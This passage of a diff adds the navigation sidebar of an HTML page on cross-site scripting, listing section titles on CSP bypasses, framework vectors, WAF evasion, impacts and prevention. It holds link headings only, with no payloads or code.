+            <li><a href="#3-wildcard-in-script-src"><strong>3. Wildcard in <code>script-src</code></strong></a></li>
+            <li><a href="#4-missing-object-src-and-default-src"><strong>4. Missing <code>object-src</code> and <code>default-src</code></strong></a></li>
+            <li><a href="#5-jsonp-endpoint-allowed-in-script-src"><strong>5. JSONP Endpoint Allowed in <code>script-src</code></strong></a></li>
+            <li><a href="#6-csp-bypass-using-file-upload-functionality"><strong>6. CSP Bypass Using File Upload Functionality</strong></a></li>
+            <li><a href="#7-bypassing-csp-in-angularjs"><strong>7. Bypassing CSP in AngularJS</strong></a></li>
+            <li><a href="#8-bypass-via-open-redirect-in-whitelisted-domain"><strong>8. Bypass via Open Redirect in Whitelisted Domain</strong></a></li>
+            <li><a href="#9-encoding--to-bypass-directory-restricted-csp"><strong>9. Encoding <code>/</code> to Bypass Directory-Restricted CSP</strong></a></li>
+            <li><a href="#10-csp-bypass-using-open-redirect--jsonp-chained-attack"><strong>10. CSP Bypass Using Open Redirect + JSONP (Chained Attack)</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#event-handler-bypass"><strong>Event Handler Bypass</strong></a></li>
+        <li><a href="#advanced-xss-scenarios">Advanced XSS Scenarios</a>
+          <ul>
+            <li><a href="#1-phantomjs-html-injection--xss--ssrflfr">1. PhantomJS HTML Injection → XSS → SSRF/LFR</a></li>
+            <li><a href="#2-csrf--xss-chaining"><strong>2. CSRF + XSS Chaining</strong></a></li>
+            <li><a href="#core-idea"><strong>Core Idea:</strong></a></li>
+            <li><a href="#chaining-logic-"><strong>Chaining Logic :</strong></a></li>
+            <li><a href="#1-use-xss-to-run-malicious-js"><strong>1. Use XSS to run malicious JS</strong></a></li>
+            <li><a href="#2-use-csrf-to-submit-authenticated-requests"><strong>2. Use CSRF to submit authenticated requests</strong></a></li>
+            <li><a href="#3-use-csrf-to-plant-xss-into-a-stored-field"><strong>3. Use CSRF to plant XSS into a stored field</strong></a></li>
+            <li><a href="#4-resulting-chain"><strong>4. Resulting chain</strong></a></li>
+            <li><a href="#3-bypass-httponly--xss-escalation">3. Bypass HttpOnly → XSS Escalation</a></li>
+            <li><a href="#4-xss-in-chatbot-message-renderer"><strong>4. XSS in Chatbot Message Renderer</strong></a></li>
+            <li><a href="#summary"><strong>Summary</strong></a></li>
+            <li><a href="#root-cause"><strong>Root Cause</strong></a></li>
+            <li><a href="#how-vulnerability-was-found"><strong>How Vulnerability Was Found</strong></a></li>
+            <li><a href="#payload-"><strong>Payload :</strong></a></li>
+            <li><a href="#impact"><strong>Impact</strong></a></li>
+            <li><a href="#exploit-flow"><strong>Exploit Flow</strong></a></li>
+            <li><a href="#5-stored-xss-in-gitlab-user-profile"><strong>5. Stored XSS in GitLab User Profile</strong></a></li>
+            <li><a href="#root-cause-1"><strong>Root Cause</strong></a></li>
+            <li><a href="#injection-point"><strong>Injection Point</strong></a></li>
+            <li><a href="#exploit-flow-1"><strong>Exploit Flow:</strong></a></li>
+            <li><a href="#1-attacker-edits-profile"><strong>1. Attacker edits profile</strong></a></li>
+            <li><a href="#2-server-stores-payload-in-db"><strong>2. Server stores payload in DB</strong></a></li>
+            <li><a href="#3-admin-opens-attackers-profile"><strong>3. Admin opens attacker’s profile</strong></a></li>
+            <li><a href="#4-script-executes-in-admins-browser"><strong>4. Script executes in admin’s browser</strong></a></li>
+            <li><a href="#5-attacker-gains-control"><strong>5. Attacker gains control</strong></a></li>
+            <li><a href="#its-of-high-impact"><strong>It’s of High Impact</strong></a></li>
+            <li><a href="#potential-payloads"><strong>Potential Payloads</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#framework-specific-vectors">Framework-Specific Vectors</a>
+          <ul>
+            <li><a href="#1-vuejs">1. Vue.js</a></li>
+            <li><a href="#vuejs--prototype-pollution--xss-cve-2024-6783"><strong>Vue.js – Prototype Pollution → XSS (CVE-2024-6783)</strong></a></li>
+            <li><a href="#flow-of-attack-">Flow of Attack :</a></li>
+            <li><a href="#payloads-"><strong>Payloads :</strong></a></li>
+            <li><a href="#2-angularjs">2. AngularJS</a></li>
+            <li><a href="#angularjs--expression-sandbox-escape"><strong>AngularJS – Expression Sandbox Escape</strong></a></li>
+            <li><a href="#flow-of-attack--1"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payload--1"><strong>Payload :</strong></a></li>
+            <li><a href="#3-react">3. React</a></li>
+            <li><a href="#react--dangerous-html-rendering"><strong>React – Dangerous HTML Rendering</strong></a></li>
+            <li><a href="#flow-of-attack--2"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payloads--1"><strong>Payloads :</strong></a></li>
+            <li><a href="#4-jquery">4. jQuery</a></li>
+            <li><a href="#jquery--xss-via-improper-html-handlingcve-2020-7656"><strong>jQuery – XSS via Improper HTML Handling(CVE-2020-7656)</strong></a></li>
+            <li><a href="#flow-of-attack--3"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payload--2"><strong>Payload :</strong></a></li>
+            <li><a href="#xss-via-prototype-pollutioncve-2019-11358"><strong>XSS via Prototype Pollution</strong>(CVE-2019-11358)</a></li>
+            <li><a href="#flow-of-attack--4"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payloads--2"><strong>Payloads :</strong></a></li>
+            <li><a href="#5-django">5. Django</a></li>
+            <li><a href="#django--unsafe-template-rendering"><strong>Django – Unsafe Template Rendering</strong></a></li>
+            <li><a href="#flow-of-attack--5"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payloads--3"><strong>Payloads :</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#encoding-and-obfuscation">Encoding and Obfuscation</a>
+          <ul>
+            <li><a href="#encoding"><strong>Encoding</strong></a></li>
+            <li><a href="#obfuscation"><strong>Obfuscation</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#waf-bypasses-techniques"><strong>WAF Bypasses Techniques</strong></a>
+          <ul>
+            <li><a href="#flow-after-encoding--obfuscation-"><strong>FLOW After encoding , obfuscation :</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#impacts-of-xss">Impacts of XSS</a>
+          <ul>
+            <li><a href="#1-session-hijacking"><strong>1. Session Hijacking</strong></a></li>
+            <li><a href="#2-credential-theft"><strong>2. Credential Theft</strong></a></li>
+            <li><a href="#3-keylogging"><strong>3. Keylogging</strong></a></li>
+            <li><a href="#4-phishing-through-dom-injection"><strong>4. Phishing Through DOM Injection</strong></a></li>
+            <li><a href="#5-malware-distribution"><strong>5. Malware Distribution</strong></a></li>
+            <li><a href="#6-account-takeover--privilege-abuse"><strong>6. Account Takeover / Privilege Abuse</strong></a></li>
+            <li><a href="#7-csrf-automation-via-xss"><strong>7. CSRF Automation via XSS</strong></a></li>
+            <li><a href="#8-internal-network-scanning"><strong>8. Internal Network Scanning</strong></a></li>
+            <li><a href="#9-stored-worm--self-propagating-xss"><strong>9. Stored Worm / Self-Propagating XSS</strong></a></li>
+            <li><a href="#10-browser-exploitation"><strong>10. Browser Exploitation</strong></a></li>
+            <li><a href="#11-data-exfiltration"><strong>11. Data Exfiltration</strong></a></li>
+            <li><a href="#12-ui-redressing--clickjacking-assistance"><strong>12. UI Redressing / Clickjacking Assistance</strong></a></li>
+            <li><a href="#13-stored-defacement"><strong>13. Stored Defacement</strong></a></li>
+            <li><a href="#14-supply-chain-attack-via-xss"><strong>14. Supply-Chain Attack via XSS</strong></a></li>
+            <li><a href="#15-email--notification-hijacking"><strong>15. Email / Notification Hijacking</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#prevention-techniques">Prevention Techniques</a>
+          <ul>
+            <li><a href="#input-validation">Input Validation</a></li>
+            <li><a href="#output-encoding">Output Encoding</a></li>
+            <li><a href="#content-security-policy-csp">Content Security Policy (CSP)</a></li>
+            <li><a href="#secure-cookies">Secure Cookies</a></li>
+            <li><a href="#safe-dom-handling">Safe DOM Handling</a></li>
+          </ul>
+        </li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
